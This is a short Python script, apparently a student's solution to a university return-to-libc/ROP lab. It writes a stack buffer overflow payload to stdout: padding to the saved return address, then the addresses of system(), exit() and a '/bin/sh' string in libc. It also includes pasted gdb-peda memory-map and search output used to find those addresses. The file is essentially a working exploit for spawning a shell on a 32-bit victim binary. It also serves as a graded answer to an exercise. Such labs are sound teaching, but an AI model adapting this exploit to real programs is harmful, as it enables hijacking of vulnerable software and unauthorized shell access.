import struct
import sys

your_buffer =  ""
# YOUR CODE: Generate buf appropriately
system_addr = 0xf7e1d040
exit_addr = 0xf7e0f990
"""
bin/sh string address search: 
gdb-peda$ info proc map
process 30132
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/cse543-f22/rop-attack-sim/Project-Files/bin/victim9-binary
         0x8049000  0x804a000     0x1000     0x1000 /home/cse543-f22/rop-attack-sim/Project-Files/bin/victim9-binary
         0x804a000  0x804b000     0x1000     0x2000 /home/cse543-f22/rop-attack-sim/Project-Files/bin/victim9-binary
         0x804b000  0x804c000     0x1000     0x2000 /home/cse543-f22/rop-attack-sim/Project-Files/bin/victim9-binary
         0x804c000  0x804d000     0x1000     0x3000 /home/cse543-f22/rop-attack-sim/Project-Files/bin/victim9-binary
         0x804d000  0x806f000    0x22000        0x0 [heap]
        0xf7dd8000 0xf7df5000    0x1d000        0x0 /usr/lib/i386-linux-gnu/libc-2.31.so
        0xf7df5000 0xf7f4a000   0x155000    0x1d000 /usr/lib/i386-linux-gnu/libc-2.31.so
        0xf7f4a000 0xf7fba000    0x70000   0x172000 /usr/lib/i386-linux-gnu/libc-2.31.so
        0xf7fba000 0xf7fbb000     0x1000   0x1e2000 /usr/lib/i386-linux-gnu/libc-2.31.so
        0xf7fbb000 0xf7fbd000     0x2000   0x1e2000 /usr/lib/i386-linux-gnu/libc-2.31.so
        0xf7fbd000 0xf7fbf000     0x2000   0x1e4000 /usr/lib/i386-linux-gnu/libc-2.31.so
        0xf7fbf000 0xf7fc1000     0x2000        0x0 
        0xf7fca000 0xf7fcc000     0x2000        0x0 
        0xf7fcc000 0xf7fd0000     0x4000        0x0 [vvar]
        0xf7fd0000 0xf7fd2000     0x2000        0x0 [vdso]
        0xf7fd2000 0xf7fd3000     0x1000        0x0 /usr/lib/i386-linux-gnu/ld-2.31.so
        0xf7fd3000 0xf7ff0000    0x1d000     0x1000 /usr/lib/i386-linux-gnu/ld-2.31.so
        0xf7ff0000 0xf7ffb000     0xb000    0x1e000 /usr/lib/i386-linux-gnu/ld-2.31.so
        0xf7ffc000 0xf7ffd000     0x1000    0x29000 /usr/lib/i386-linux-gnu/ld-2.31.so
        0xf7ffd000 0xf7ffe000     0x1000    0x2a000 /usr/lib/i386-linux-gnu/ld-2.31.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

        gdb-peda$ searchmem "/bin/sh" 0xf7dd8000 0xf7fbd000
                  Searching for '/bin/sh' in range: 0xf7dd8000 - 0xf7fbd000
                  Found 1 results, display max 1 items:
                  libc : 0xf7f64338 ("/bin/sh")
"""
bin_sh_addr = 0xf7f64338
eip_addr = 0xffffcecc 
buf_addr = 0xffffccd3
offset = eip_addr - buf_addr
# print("Offset9: ", offset)

junk = b"*" * offset

rop_instruction_chain = struct.pack("<I", system_addr) + struct.pack("<I", exit_addr) + struct.pack("<I", bin_sh_addr)
your_buffer = junk + rop_instruction_chain

sys.stdout.buffer.write(your_buffer)